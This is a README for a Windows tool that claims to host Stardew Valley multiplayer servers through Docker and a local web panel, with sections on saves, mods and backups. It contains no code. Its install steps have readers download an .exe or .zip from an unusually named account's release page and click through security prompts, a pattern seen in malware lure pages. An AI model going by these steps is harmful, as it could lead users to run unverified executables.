# 🐾 puppy-stardew-server - Host your own Stardew Valley world

[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/iffy-genusblandfordia5006/puppy-stardew-server/releases)

This application lets you host a multiplayer Stardew Valley server on your computer. You gain control over your game world, manage saved files, add mods, and keep backups. The software handles technical setup through a simple web dashboard. You do not need experience with code or server management to run this.

## 🛠️ Requirements

Before you begin, ensure your computer meets these minimum standards:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** 8 GB of RAM or more.
*   **Storage:** 5 GB of free drive space.
*   **Network:** An active internet connection.
*   **Software:** You must install Docker Desktop for Windows before opening this application.

## 📥 Getting the Files

You need the correct files to start your server. 

1. Visit the [official releases page](https://github.com/iffy-genusblandfordia5006/puppy-stardew-server/releases).
2. Look for the latest version at the top of the list.
3. Click the file ending in `.zip` or `.exe` to download it to your computer.
4. Save this file to a folder you can find easily, such as your Downloads folder or a dedicated Games folder.

## ⚙️ Installation Steps

Follow these steps to set up your server environment.

1. **Install Docker Desktop:** If you do not have Docker Desktop installed, download it from the official Docker website and follow the installation prompts. Restart your computer after the install finishes.
2. **Extract Files:** If you downloaded a `.zip` file, right-click the file and select "Extract All." Choose a folder location on your computer.
3. **Run the Application:** Locate the application file in the extracted folder. Double-click the file to launch the server interface.
4. **Grant Permissions:** Your computer might show a security prompt. Click "Run" or "Yes" to allow the software to process network connections.
5. **Initial Configuration:** The software handles the primary setup automatically. Wait for the terminal window to show a message that the server is ready. 

## 🌐 Using the Web Panel

Once the server runs, you manage your game through a web dashboard. 

1. Open your web browser.
2. Type `http://localhost:8080` into the address bar and press Enter.
3. This brings you to the control panel. From here, you can start or stop your farm, upload save files, and view server logs.

## 🛡️ Managing Your Saves

You can move your existing Stardew Valley farm to the server. 

1. Open your local Windows save folder (usually found in `%AppData%\StardewValley\Saves`).
2. Copy your farm folder.
3. Open the puppy-stardew-server web panel.
4. Select the "Save Management" tab.
5. Upload your folder using the tool provided in the panel. The server will detect your farm and load it when you start the service.

## 🧩 Adding Mods

The server supports modding. Follow these steps to add custom content to your multiplayer world.

1. Download the mods you wish to use from a trusted source.
2. Ensure the files stay in their original folder structure.
3. In the web panel, navigate to the "Mod Workflows" section.
4. Click the "Upload Mods" button.
5. Select your mod files.
6. Restart the server through the panel to apply the changes.

## 💾 Backups

The software creates automatic backups of your game data. 

1. Go to the "Backups" tab in the web panel.
2. You see a list of timestamps showing when the system saved your data.
3. Click "Restore" next to any entry if you need to revert your farm to a previous state.
4. Download a copy of your backup to your local machine by clicking the "Download" button to keep a secondary copy for safety.

## 🔧 Troubleshooting

If you encounter issues, check these common items:

*   **Server does not start:** Confirm Docker Desktop is running. Look for the small whale icon in your system tray.
*   **Cannot access the panel:** Ensure no other application uses port 8080. If another program uses that port, change the setting in the configuration file included with the download.
*   **Multiplayer connections failing:** Ensure your Windows Firewall allows the server application to reach the internet. You may need to create an exception rule for the application if your friends cannot connect to your farm.

## 📝 Frequently Asked Questions

**Does this software slow down my computer?**
Running a server uses system resources. If your game runs slowly, try closing other heavy applications while the server runs.

**Can I run the server without the web panel?**
The web panel is the primary way to interact with the server. It is recommended to use it for all management tasks.

**Is my game progress saved if I close the server?**
The system saves your progress automatically at regular intervals. Use the "Stop" button in the web panel to ensure the system saves your data before you close the application.

**How do I update the software?**
Visit the [releases page](https://github.com/iffy-genusblandfordia5006/puppy-stardew-server/releases) again. Download the newest version and replace the old files with the new ones. Your save files remain in their specific folder so they carry over to the new version.

**Does everyone in my game need the same mods?**
All players should have the same mods installed to prevent errors. Share your mod list with your friends to keep the game stable for everyone.